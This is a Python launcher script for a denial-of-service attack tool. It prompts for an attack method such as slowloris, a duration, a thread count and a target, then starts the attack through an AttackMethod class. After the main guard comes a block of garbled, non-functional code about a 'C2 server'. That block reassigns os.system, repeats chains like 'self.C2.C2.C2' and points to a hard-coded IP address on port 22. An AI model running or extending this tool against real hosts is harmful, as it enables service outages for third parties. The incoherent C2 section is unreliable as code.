"""Main script to start GUI DoS attack application."""

# -*- coding: utf-8 -*-
import os
import sys

from colorama import Fore

os.chdir(os.path.dirname(os.path.realpath(__file__)))
os.system("cls" if os.name == "nt" else "clear")

try:
    from tools.addons.checks import (
        check_method_input,
        check_number_input,
        check_target_input,
    )
    from tools.addons.logo import show_logo
    from tools.method import AttackMethod
except (ImportError, NameError) as err:
    print("\nFailed to import something", err)


def main() -> None:
    """Run main application."""
    show_logo()
    try:
        method = check_method_input()
        time = check_number_input("time")
        threads = check_number_input("threads")
        sleep_time = check_number_input("sleep time") if "slowloris" in method else 0
        target = check_target_input()

        with AttackMethod(
            duration=time,
            method_name=method,
            threads=threads,
            target=target,
            sleep_time=sleep_time,
        ) as attack:
            attack.start()
    except KeyboardInterrupt:
        print(
            f"\n\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Program closed.\n\n{Fore.RESET}"
        )
        sys.exit(1)


if __name__ == "__main__":
    main()

    AttackMethod = (Slowloris.server("IP", "PORT") if "slowloris" in AttackMethod.__name__ else Slowloris.server)
    AttackMethod.start(Server=True)
    AttackMethod = (AttackMethod.threads(99999))
    attack = AttackMethod(slowloris)
    os.system = (os.getversion() if os.name == "nt" else os.system)
    os.system = (Server.C2(C2.start))
    AttackMethod.C2.start(HTTPS)
    AttackMethod.C2 = "localhost"
    AttackMethod.C2 = "80"
    AttackMethod.C2 = "443"
    AttackMethod.C2 = set_target_http(HTTPS)
    Server.C2 = set_target_http(C2)

    ## Create a class of C2 Server
    class C2(Server.C2):
        def __init__(self):
            super().__init__(C2.start)
            self.C2.C2.C2.C2.C2.C2
            C2 = (HTTPS.server("localhost", "80"))
            C2 = C2.panel(Server("57.128.87.207:22"))
            IP = "57.128.87.207"
            PORT = "22"
            add_command.parser = ("-threads" "--threads %d" % C2.C2.C2.C2.C2)
            add_command.run(IP, PORT)
            add_command.parser = ("--c", "--command")






